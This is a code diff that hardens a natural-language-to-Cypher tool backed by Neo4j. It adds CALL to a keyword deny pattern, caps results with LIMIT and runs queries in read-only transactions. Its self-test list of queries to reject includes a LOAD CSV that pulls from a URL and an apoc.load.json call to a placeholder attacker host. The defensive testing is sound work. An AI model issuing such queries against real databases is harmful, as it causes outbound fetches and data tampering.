@@ -168,10 +168,25 @@ _ANSWER_SYSTEM_PROMPT = """You write a short, natural-language answer to a quest
 # Read-only validator. Defense in depth: even if the LLM emits a write,
 # this layer refuses to execute it.
 # --------------------------------------------------------------------------- #
+# CALL is blocked too: this schema needs no procedures or subqueries, and
+# blocking it closes the apoc.* surface (e.g. apoc.load.json → outbound HTTP
+# from the DB, apoc.export.*). A regex blacklist is only the first layer;
+# run_cypher() also executes inside a server-enforced READ transaction.
 _FORBIDDEN_PATTERN = re.compile(
-    r"\b(CREATE|MERGE|DELETE|SET|REMOVE|DROP|DETACH|FOREACH|LOAD\s+CSV|USING\s+PERIODIC)\b",
+    r"\b(CREATE|MERGE|DELETE|SET|REMOVE|DROP|DETACH|FOREACH|CALL|LOAD\s+CSV|USING\s+PERIODIC)\b",
     re.IGNORECASE,
 )
+
+# Hard cap on the number of rows any single query may return.
+_MAX_ROWS = 100
+
+
+def enforce_limit(cypher: str, default: int = _MAX_ROWS) -> str:
+    """Append a LIMIT if the query has none, to bound result size (anti-DoS)."""
+    c = cypher.rstrip().rstrip(";").rstrip()
+    if re.search(r"\bLIMIT\s+\d+\b", c, re.IGNORECASE):
+        return c
+    return f"{c}\nLIMIT {default}"
 
 
 def _strip_fences(text: str) -> str:
@@ -260,14 +275,27 @@ def translate_llm(question: str) -> str:
 # Execution
 # --------------------------------------------------------------------------- #
 def run_cypher(cypher: str, params: dict | None = None) -> list[dict]:
-    """Run a read-only Cypher against Neo4j AuraDB and return rows as dicts."""
-    validate_readonly(cypher)  # belt-and-braces: re-validate at execution time
+    """
+    Run read-only Cypher against Neo4j and return rows as dicts.
+
+    Three layers of defense:
+      1. validate_readonly() — refuse any write/CALL keyword (belt-and-braces
+         re-check at execution time, even if the caller already validated).
+      2. enforce_limit()     — bound the result size (anti-DoS).
+      3. execute_read()      — run inside a server-enforced READ transaction;
+         Neo4j itself rejects any write, so the regex is not the only guard.
+    """
+    validate_readonly(cypher)
+    cypher = enforce_limit(cypher)
     drv = _neo_driver()
-    rows = []
     try:
         with drv.session() as s:
-            for rec in s.run(cypher, **(params or {})):
-                rows.append({k: rec[k] for k in rec.keys()})
+            def _work(tx):
+                return [
+                    {k: rec[k] for k in rec.keys()}
+                    for rec in tx.run(cypher, **(params or {}))
+                ]
+            rows = s.execute_read(_work)
     finally:
         drv.close()
     return rows
@@ -400,6 +428,9 @@ if __name__ == "__main__":
         "MERGE (d:Dog {name:'X'})",
         "MATCH (d:Dog) DETACH DELETE d",
         "LOAD CSV WITH HEADERS FROM 'http://x' AS r CREATE (:Dog {name: r.name})",
+        "CALL apoc.load.json('http://attacker/x') YIELD value RETURN value",
+        "CALL dbms.components() YIELD name RETURN name",
+        "MATCH (d:Dog) CALL { WITH d MATCH (d)-[:HAS_DRIFT]->(x) RETURN x } RETURN d, x",
     ]
     print("=== validator self-test ===")
     for q in good:
@@ -417,4 +448,9 @@ if __name__ == "__main__":
     # Strip-fences smoke
     assert _strip_fences("```cypher\nMATCH (d:Dog) RETURN d\n```") == "MATCH (d:Dog) RETURN d"
     print("  OK    : fence stripping works")
+    # enforce_limit smoke
+    assert enforce_limit("MATCH (d:Dog) RETURN d").endswith("LIMIT 100")
+    assert enforce_limit("MATCH (d:Dog) RETURN d LIMIT 5").endswith("LIMIT 5")
+    assert enforce_limit("MATCH (d:Dog) RETURN d;").endswith("LIMIT 100")
+    print("  OK    : LIMIT enforcement works")
     print(f"  LLM available: {_anthropic_available()}  (model={_model()})")
